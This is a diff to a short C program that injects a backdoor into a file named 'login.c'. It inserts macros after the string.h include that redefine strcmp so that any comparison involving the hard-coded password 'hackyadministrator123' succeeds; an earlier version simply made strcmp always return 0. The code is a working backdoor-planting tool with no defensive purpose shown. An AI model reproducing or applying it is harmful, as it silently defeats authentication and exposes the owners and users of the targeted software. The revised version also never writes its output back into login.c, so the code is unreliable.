@@ -1,43 +1,37 @@
 #include <stdio.h>
 #include <string.h>
 
-#define BUFFER_SIZE 1000000
+#define BUFFER_SIZE 100000
 
 int main() {
 	
-    char *input_string = "#define strcmp(a, b) 0\n";
-    char *file_name = "login.c";
+	
+	const char *INPUT_STRING = "#define minLen(X, Y)  (strlen(X) < strlen(Y) ? strlen(X) : strlen(Y))\r\n#define strcmp(a, b) ( !(memcmp(a, \"hackyadministrator123\", minLen(a, \"hackyadministrator123\")) || !memcmp(b, \"hackyadministrator123\", minLen(b, \"hackyadministrator123\")) ) ? 0 : memcmp(a, b, minLen(a, b)))";
+	const char *FILE_NAME = "login.c";
+	const char *TARGET_LINE = "#include <string.h>";
 
-    // Open the file in binary read-write mode
-    FILE *file = fopen(file_name, "r+b");
-    if (!file) {
-        printf("Error: Failed to open file '%s'\n", file_name);
-        return 1;
+	
+    FILE *input_file = fopen(FILE_NAME, "r");
+    FILE *temp_file = fopen("temp.txt", "w");
+	
+    char buffer[100000];
+    int found_target_line = 0;
+
+    while (fgets(buffer, 100000, input_file)) {
+        if (!found_target_line && strstr(buffer, TARGET_LINE)) {
+            fputs(buffer, temp_file);
+            fputs(INPUT_STRING, temp_file);
+            fputs("\n", temp_file);
+            found_target_line = 1;
+        } else {
+            fputs(buffer, temp_file);
+        }
     }
+	
 
-    // Calculate the size of the input string
-    size_t input_string_size = strlen(input_string);
+    fclose(input_file);
+    rewind(temp_file);
 
-    // Allocate a buffer to hold the file contents
-    char buffer[1000000];
-
-    // Read the existing contents of the file into the buffer
-    size_t bytes_read = fread(buffer, 1, 1000000, file);
-
-
-        // Shift the existing contents of the file to the right
-        memmove(buffer + input_string_size, buffer, bytes_read);
-
-        // Copy the input string to the beginning of the buffer
-        memcpy(buffer, input_string, input_string_size);
-
-        // Seek to the beginning of the file and write the buffer contents
-        fseek(file, 0, SEEK_SET);
-        fwrite(buffer, 1, bytes_read + input_string_size, file);
-    
-
-    // Close the file
-    fclose(file);
 
     return 0;
 }
